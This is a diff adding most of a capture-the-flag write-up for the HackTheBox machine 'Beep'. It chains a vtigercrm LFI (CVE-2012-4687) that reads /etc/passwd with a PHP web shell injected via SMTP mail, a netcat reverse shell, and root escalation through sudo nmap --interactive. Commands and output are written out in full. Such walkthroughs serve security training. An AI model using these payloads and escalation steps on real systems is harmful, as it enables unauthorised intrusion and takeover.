@@ -129,3 +129,135 @@ https://beep.htb/libs                 (Status: 301) [Size: 304] [--> https://bee
 https://beep.htb/configs              (Status: 301) [Size: 307] [--> https://beep.htb/configs/] 
 https://beep.htb/recordings           (Status: 301) [Size: 310] [--> https://beep.htb/recordings/]
 ```
+
+Next, we will visit https://beep.htb/vtigercrm and with some research, we realize that we can abuse the LFI from [CVE-2012-4687](https://www.exploit-db.com/exploits/18770). Afterwards, we will try to exploit LFI to RCE using ```/proc/self/fd/*``` but it failed. 
+
+Using the LFI vulnerability, we can access the ```/proc/self/status``` that tells us the running process. From the output, we can find that a user with UID 100 and GID 101 is running the process in the background
+
+![Viewing /proc/self/status](https://github.com/joelczk/writeups/blob/main/HTB/Images/Beep/proc_status.PNG)
+
+Changing the LFI payload to ```/etc/passwd```, we are able to find that UID 100 and GID 101 is the user *asterisk*
+
+![/etc/passwd file](https://github.com/joelczk/writeups/blob/main/HTB/Images/Beep/etc_passwd.PNG)
+
+Recalling that we have an SMTP service at port 25, we will try to connect to the SMTP server and wait for the server banner. Notice that we are using ```beep.localdomain```
+
+```
+┌──(kali㉿kali)-[~]
+└─$ telnet 10.10.10.7 25 
+Trying 10.10.10.7...
+Connected to 10.10.10.7.
+Escape character is '^]'.
+220 beep.localdomain ESMTP Postfix
+```
+Next, we will identify ourselves to the server (We can use any random email addresses), and the server will return us the list of commands that we can use
+
+```
+EHLO test@test.com
+250-beep.localdomain
+250-PIPELINING
+250-SIZE 10240000
+250-VRFY
+250-ETRN
+250-ENHANCEDSTATUSCODES
+250-8BITMIME
+250 DSN
+```
+
+We will then move on to verify that the user *asterisk* exists on the SMTP server
+
+```
+VRFY asterisk@beep.localdomain
+252 2.0.0 asterisk@beep.localdomain
+```
+
+Now, we will send an email to *asterisk@beep.localdomain* using the SMTP server
+
+```
+MAIL FROM:test@test.com
+250 2.1.0 Ok
+RCPT TO:asterisk@beep.localdomain
+250 2.1.5 Ok
+DATA
+354 End data with <CR><LF>.<CR><LF>
+Subject: Exploit
+<?php echo system($_REQUEST['cmd']);?>
+
+.
+250 2.0.0 Ok: queued as DCBF1D92FD
+```
+
+Now, we will view the sent mail on ```/var/mail/asterisk```. However, we realize that there is no command execution yet.
+
+![mail on asterisk](https://github.com/joelczk/writeups/blob/main/HTB/Images/Beep/mail.PNG)
+
+## Obtaining user flag
+
+Next, we will modify the payload to obtain a reverse shell.
+![Reverse shell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Beep/rev_shell.PNG)
+
+Now, we all we have to do is to obtain the user flag.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 3000
+listening on [any] 3000 ...
+connect to [10.10.16.5] from (UNKNOWN) [10.10.10.7] 40702
+bash: no job control in this shell
+bash-3.2$ cd /home/fanis
+bash-3.2$ cat user.txt
+<Redacted user flag>
+bash-3.2$ 
+```
+
+## Obtaining root flag
+
+We will first look at the privileges that we have using ```sudo -l```. We realize that we can execute nmap with root privileges without password 
+
+```
+bash-3.2$ sudo -l
+Matching Defaults entries for asterisk on this host:
+    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
+    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
+    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
+    XAUTHORITY"
+
+User asterisk may run the following commands on this host:
+    (root) NOPASSWD: /sbin/shutdown
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/bin/yum
+    (root) NOPASSWD: /bin/touch
+    (root) NOPASSWD: /bin/chmod
+    (root) NOPASSWD: /bin/chown
+    (root) NOPASSWD: /sbin/service
+    (root) NOPASSWD: /sbin/init
+    (root) NOPASSWD: /usr/sbin/postmap
+    (root) NOPASSWD: /usr/sbin/postfix
+    (root) NOPASSWD: /usr/sbin/saslpasswd2
+    (root) NOPASSWD: /usr/sbin/hardware_detector
+    (root) NOPASSWD: /sbin/chkconfig
+    (root) NOPASSWD: /usr/sbin/elastix-helper
+```
+
+Next, we will use nmap to spawn a root shell and stabilize the root shell.
+
+```
+bash-3.2$ sudo nmap --interactive
+
+Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+sh: line 1: python3: command not found
+/usr/bin/script -qc /bin/bash /dev/null
+bash-3.2# export TERM=xterm
+bash-3.2# stty cols 132 rows 34
+```
+
+All that is left for us to do is to obtain the root flag.
+
+```
+bash-3.2# cat /root/root.txt
+<Redacted root flag>
+```
